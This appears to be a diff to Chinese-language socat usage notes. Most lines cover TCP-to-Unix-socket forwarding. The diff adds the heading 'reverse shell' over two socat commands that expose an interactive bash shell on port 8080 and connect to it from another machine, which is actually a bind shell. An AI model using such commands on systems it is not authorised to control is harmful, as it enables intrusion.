@@ -10,6 +10,7 @@ socat TCP-LISTEN:端口号,fork UNIX-CONNECT:/usr/local/var/run/ovn//usr/local/v
 将 TCP 转换为 Unix Socket
 socat TCP-CONNECT:目标地址:端口号 UNIX-CLIENT:/path/to/unix/socket
 
+反弹shell
 socat TCP-LISTEN:8080,reuseaddr,fork,max-children=5 EXEC:"bash -i",pty,stderr,setsid,sigint,raw,echo=0,crnl
 
 socat - TCP:服务器IP:8080,setsid,crnl
